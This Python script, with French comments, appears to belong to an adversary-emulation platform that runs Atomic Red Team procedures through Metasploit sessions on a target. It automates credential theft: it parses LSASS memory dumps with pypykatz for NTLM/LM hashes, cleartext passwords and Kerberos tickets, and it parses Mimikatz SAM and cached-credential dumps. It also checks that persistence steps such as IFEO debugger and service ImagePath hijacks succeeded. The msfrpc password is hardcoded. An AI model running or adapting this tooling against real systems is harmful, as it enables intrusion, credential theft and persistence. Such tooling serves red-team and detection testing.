import yaml
import argparse
import os
import glob
from pymetasploit3.msfrpc import MsfRpcClient
import time
import json
import sqlite3
from datetime import datetime
import re
from pypykatz.pypykatz import pypykatz

# Créer un objet ArgumentParser
parser = argparse.ArgumentParser()

# Ajouter les arguments attendus

parser.add_argument('--tactic', type=str, required=True, help='tactic name')
parser.add_argument('--technique', type=str, required=True, help='technique id')
parser.add_argument('--procedure', type=str, required=True, help='procedure name')
parser.add_argument('--session_uuid', type=str, required=True, help='msf session uuid')
parser.add_argument('--activity_id', type=str, required=True, help='activity id')
parser.add_argument('--session_os', type=str, required=True, help='session os')
parser.add_argument('--target_address', type=str, required=True, help='target address')



args = parser.parse_args()


origin_dir_path = os.path.abspath(os.getcwd())
technique_directory = os.path.join("My_app/scripts/atomics", args.tactic, args.technique)
os.chdir(technique_directory)

# Récuperer tout les fichiers qui se terminent par .yaml
yaml_files = glob.glob("*yaml")

#Ouvrture du fichier .yaml qui représente la technique pour récuperer la commande et l'executeur
with open(yaml_files[0], 'r') as file:
    yaml_data = yaml.safe_load(file)

my_atomic_test = None
for atomic_test in yaml_data["atomic_tests"]:
    if atomic_test["name"] == args.procedure:
        my_atomic_test = atomic_test

print("ma procedure ----> " + args.procedure)
print(my_atomic_test)
command = my_atomic_test["executor"]["command"]
command_executor = my_atomic_test["executor"]["name"]

# Extraire les valeurs des variables et les stocker dans un dictionnaire
variables = None
valeurs_variables = None

if "input_arguments" in my_atomic_test:
    variables = my_atomic_test['input_arguments']
    valeurs_variables = {nom_variable: valeur_variable['default'] for nom_variable, valeur_variable in variables.items()}

    command = command.replace("#{", "{")
    # remplacer uniquement les clés existantes dans valeurs_variables en utilisant une expression régulière
    pattern = re.compile(r"{(\w+)}")
    command = pattern.sub(lambda match: str(valeurs_variables.get(match.group(1), match.group(0))), command)

    #afficher la commande mise à jour
    print("------------------------------------------------------->" + command)

    #command = command.format(**valeurs_variables)

list_command = command.split("\n")


# retourner au repertoire d'origine
os.chdir(origin_dir_path)

# jusqu'a maintenant on a récuperer les commandes a exécuter et l'éxecuteur maintenant il faut executer les commandes

# est ce que j'execute commande par commande ou bien je fais un script et j'execute le script ????????????????
# Est quand je met tout a la fois (je parle des commandes) il va y'avoir une erreur ou bien dés que la première commande retourne un résultat ca arrete l'execution ???????????
# comment mettre en place les dépendances ????????????

# Se connecter au serveur Metasploit
client = MsfRpcClient('anis', ssl=True)

# recuperer la session.
shell = client.sessions.session(args.session_uuid)

# on vérifie d'abord si on sur un meterpreter ou non
meterpreter = False
for key, value in client.sessions.list.items():
    if value["uuid"] == args.session_uuid:
        if value["type"] == "meterpreter":  # si c'est un meterpreter dans ce cas on bascule au shell
            meterpreter = True
        break

results = {
    'commands': {

    }
}
if command_executor == "sh":

    # si y'a un meterpreter on pass au shell
    if meterpreter == True:
        shell.write("shell")
        time.sleep(3)
        shell.read()

    #on execute les commandes
    for command in list_command:
        if len(command) != 0:
            command = "/bin/sh -c " + "'" + command.strip("\n") + "'"
            # print(command) # juste pour voir
            shell.read()
            shell.write(command)
            time.sleep(3)
            command_output = shell.read()
            results['commands'][command] = command_output
            print(command + " ---> " + command_output)

    # faire revenir le meterpreter
    if meterpreter == True:
        shell.write("exit")
        shell.read()

elif command_executor == "bash":

    # si y'a un meterpreter on pass au shell
    if meterpreter == True:
        shell.write("shell")
        time.sleep(3)
        shell.read()

    #executer les commandes
    for command in list_command:
        if len(command) != 0:
            command = "/bin/bash -c " + "'" + command + "'"
            # print(command) # juste pour voir
            shell.read()
            shell.write(command)
            time.sleep(3)
            command_output = shell.read()
            results['commands'][command] = command_output
            print(command + " ---> " + command_output)

    # faire revenir le meterpreter
    if meterpreter == True:
        shell.write("exit")
        time.sleep(3)
        shell.read()

elif command_executor == "command_prompt":

    if args.procedure == "Dump-SAM-With-Mimikatz" or args.procedure == "Cached Credential Dump via Mimikatz":
        
        if meterpreter == True:#------------------> ajouté maintenant

            shell.write("shell")#
            time.sleep(5)#
            shell.read()#

        for command in list_command:
            if len(command) != 0:
                if command == " token::elevate":#
                    shell.read()  #
                    shell.write(command)  #
                    time.sleep(10)  #
                    command_output = shell.read()  #
                elif command == "exit": #------------- dans le cas ou erreur dans mimikatz ca va quitter tout le shell avec le exit vers meterpreter donc il faut revenir au shell
                    print("command exit !")
                    shell.read()
                    shell.write(command)
                    time.sleep(3)
                    command_output = shell.read()
                    shell.write("shell")
                    time.sleep(5)
                    shell.read()
                else:
                    shell.read()  #
                    shell.write(command)  #
                    time.sleep(3)  #
                    command_output = shell.read()  #

                results['commands'][command] = command_output
                print(command + " ---> " + command_output)

        if meterpreter == True:  # ajouté maintenant
            shell.write("exit")  #
            time.sleep(5)  #
            shell.read()  #
    else:

        for command in list_command:
            if len(command) != 0:
                # print(command) # juste pour voir
                if meterpreter == True:

                    command_output = shell.run_shell_cmd_with_output(command, "\n")

                else:

                    shell.read()
                    shell.write(command)
                    time.sleep(3)
                    command_output = shell.read()

                results['commands'][command] = command_output
                print(command + " ---> " + command_output)



elif command_executor == "powershell":
    for command in list_command:
        if len(command) != 0:
            if meterpreter == True:
                command_output = shell.run_psh_cmd(command)
            else:
                #command = ";".join(list_command)
                #print(command)
                #command_output = shell.run_with_output("powershell -c " + command, "\n")
                #break
                command_output = shell.run_with_output("powershell -c " + command, "\n")
                
            results['commands'][command] = command_output
            print(command + " ---> " + command_output)


results["session_os"] = args.session_os
results["target_address"] = args.target_address
results["procedure"] = args.procedure

# ---------------------------------------------------------------------------------------------------------------------
#--------------- Traitement supplémentaire pour les TTPs implémentés ---------------------------------------------------

if args.tactic == 'credential_access' and args.technique == 'T1003.001' and (args.procedure == 'Dump LSASS.exe Memory using comsvcs.dll' or args.procedure == 'Dump LSASS.exe Memory using ProcDump'):
    if os.path.isfile("/home/user1/lsass.dmp"):
        res = pypykatz.parse_minidump_file('/home/user1/lsass.dmp')
        # print(res)
        katz_dict = res.to_dict()
        # print(katz_dict)
        katz_dict['logon_sessions']
        resultats = {}
        for key, value in katz_dict['logon_sessions'].items():
            resultat = {}
            sid = value['sid']
            username = ''
            ntlm_hash = ''
            lm_hash = ''
            password = ''
            domainname = ''
            TGT_info = {}
            print('key est : ' + str(key))
            if value['msv_creds'] != []:
                ntlm_hash = value['msv_creds'][0]['NThash']
                if ntlm_hash != None:
                    ntlm_hash = ntlm_hash.hex()
                lm_hash = value['msv_creds'][0]['LMHash']
                if lm_hash != None:
                    lm_hash = lm_hash.hex()
                username = value['msv_creds'][0]['username']
                domainname = value['msv_creds'][0]['domainname']
                if value['wdigest_creds'] != []:
                    # print('rentrer')
                    password = value['wdigest_creds'][0]['password']
                    if password != None:
                        password = value['wdigest_creds'][0]['password'].replace('\x00', '')
                if value['kerberos_creds'] != []:
                    if value['kerberos_creds'][0]['tickets'] != []:
                        ticket_kerberos = value['kerberos_creds'][0]['tickets']
                        print(ticket_kerberos)
                        type_ticket = ticket_kerberos['type'].name
                        service_name = ticket_kerberos['ServiceName'][0]
                        domain_name = ticket_kerberos['DomainName']
                        client_name = ticket_kerberos['EClientName']
                        start_time = ticket_kerberos['StartTime'].isoformat()
                        end_time = ticket_kerberos['EndTime'].isoformat()

                        TGT_info = {
                            'type_ticket': type_ticket,
                            'service_name': service_name,
                            'domain_name': domain_name,
                            'client_name': client_name[0],
                            'start_time': start_time,
                            'end_time': end_time

                        }

                if username != 'WINDOWS7-TARGET$' and username != None and username != "WINDOWS7$" and username != "WINDOW7$":
                    resultat = {
                        'lm_hash': lm_hash,
                        'ntlm_hash': ntlm_hash,
                        'username': username,
                        'domain_name': domainname,
                        'password': password,
                        'ticket_kerberos': TGT_info

                    }
                    resultats[sid] = resultat

                if username ==None:
                    username = ""
                if domainname == None:
                    domainname = ""
                if password == None:
                    password = ""
                if TGT_info == None:
                    TGT_info = ""
                print('le hash ntlm est : ' + str(ntlm_hash))
                print('le hash lm est : ' + str(lm_hash))
                print('le username est : ' + username)
                print('le domaine name est : ' + domainname)
                print('le password est : ' + str(password))
                print('le ticket kerberos est : ' + str(TGT_info))
                print('%%%----------------------%%%')
        print(resultats)
        results["traitement"] = resultats

    try:
        # Delete the file
        os.remove("/home/user1/lsass.dmp")
        print("File deleted successfully.")
    except OSError as e:
        # Handle file deletion error
        print(f"Error deleting the file: {e}")



if args.tactic == 'credential_access' and args.technique == 'T1003.002' and args.procedure =='Dump-SAM-With-Mimikatz':
    #verifier si le fichier existe dans le chemin d'acces pour eviter que le programme crash si le fichier existe pas
    if os.path.isfile("/home/user1/hash.txt"):

        # Ouvrir le fichier texte
        with open('/home/user1/hash.txt', 'r', encoding='latin-1') as f:
            # Lire le contenu du fichier et le stocker dans une variable
            content = f.read()
        # Diviser le contenu en blocs en utilisant des lignes vides comme délimiteur
        blocks = content.split('\n\n')
        resultats = {}

        # Parcourir chaque bloc
        for block in blocks:
            lines = block.strip().split('\n')
            rid = None
            user = None
            hash_ntlm = None

            for line in lines:
                if line.startswith('RID  : '):
                    rid = line.split(' ')[-1]
                elif line.startswith('User : '):
                    user = line.split(' ')[-1]
                elif 'Hash NTLM: ' in line:
                    hash_ntlm = line.split(' ')[-1]


            if rid and user:
                resultats[rid] = {'User': user}

                if hash_ntlm == None:
                    hash_ntlm = ""

                resultats[rid]['Hash_NTLM'] = hash_ntlm
                #if hash_ntlm:
                 #   resultats[rid]['Hash NTLM'] = hash_ntlm


        # print(resultats)
        results["traitement"] = resultats

    try:
        # Delete the file
        os.remove("/home/user1/hash.txt")
        print("File deleted successfully.")
    except OSError as e:
        # Handle file deletion error
        print(f"Error deleting the file: {e}")

if args.tactic == 'credential_access' and args.technique == 'T1003.005' and args.procedure =='Cached Credential Dump via Mimikatz':
    # verifier si le fichier existe dans le chemin d'acces pour eviter que le programme crash si le fichier existe pas
    if os.path.isfile("/home/user1/hash_dm_creds.txt"):

        # Ouvrir le fichier texte
        with open('/home/user1/hash_dm_creds.txt', 'r', encoding='latin-1') as f:
            # Lire le contenu du fichier et le stocker dans une variable
            content = f.read()
        # Diviser le contenu en blocs en utilisant des lignes vides comme délimiteur
        blocks = content.split('\n\n')
        resultats = {}

        # Parcourir chaque bloc
        for block in blocks:
            print("block ----> " + block)
            lines = block.strip().split('\n')
            rid = None
            user = None
            MsCacheV2 = None

            for line in lines:
                if line.startswith('RID'):
                    rid = line.split(' ')[-1]
                elif line.startswith('User'):
                    user = line.split(' ')[-1]
                elif 'MsCacheV2 : ' in line:
                    MsCacheV2 = line.split(' ')[-1]
            if rid and user:
                resultats[rid] = {'User': user}

                if MsCacheV2 == None:
                    MsCacheV2 = ""

                resultats[rid]['MsCacheV2'] = MsCacheV2
                #if MsCacheV2:
                 #   resultats[rid]['MsCacheV2'] = MsCacheV2


        results["traitement"] = resultats

    try:
        # Delete the file
        os.remove("/home/user1/hash_dm_creds.txt")
        print("File deleted successfully.")
    except OSError as e:
        # Handle file deletion error
        print(f"Error deleting the file: {e}")

if args.procedure == "At.exe Scheduled task":
    exist = False
    for command, val in results["commands"].items():
        if "ID = " in val:
            exist = True
            break

    if exist == True:
        results["traitement"] = "The program has been successfully scheduled using the at command."

    else:
        results["traitement"] = "The program was not successfully scheduled"


if args.procedure == "Service ImagePath Change with reg.exe":
    exist = False
    for command, val in results["commands"].items():
        if "Erreur" not in val and "Error" not in val:
            exist = True
            break

    if exist == True:
        results["traitement"] = "imagefile has been set to the path of the malicious program"
    else:
        results["traitement"] = "Failed to set imagepath to the path of the malicious program"

if args.procedure == "IFEO Add Debugger" or args.procedure == "IFEO Global Flags":
    exist = False
    for command, val in results["commands"].items():
        if "Erreur" in val or "Error" in val or "remplacer" in val or "replace" in val:
            exist = True
            break

    if exist == False:
        results["traitement"] = "Malicious program has been set successfully"
    else:
        results["traitement"] = "Error while setting malicous program"

#------------------------------- Fin du traiement supplémentaire ------------------------------------------------------
#-----------------------------------------------------------------------------------------------------------------------
print("---------------------- Fin ---------------------------")
print(results)

# Transformer le dictionnaire en JSON :
json_resultats = json.dumps(results)

# obtenir l'id de l'activite sur laquel on va enregistrer le resultat :
activity_id = int(args.activity_id)

# Se connecter a la BDD pour enregistrer le resultat sous format json :

conn = sqlite3.connect("db.sqlite3")
c = conn.cursor()

activities = c.execute("update My_app_activity set results = ? where id = ?", (json_resultats, activity_id))
activities = c.execute("update My_app_activity set end_date = ? where id = ?", (datetime.now(), activity_id))

# commit les changements :
conn.commit()

# close database connection :
conn.close()


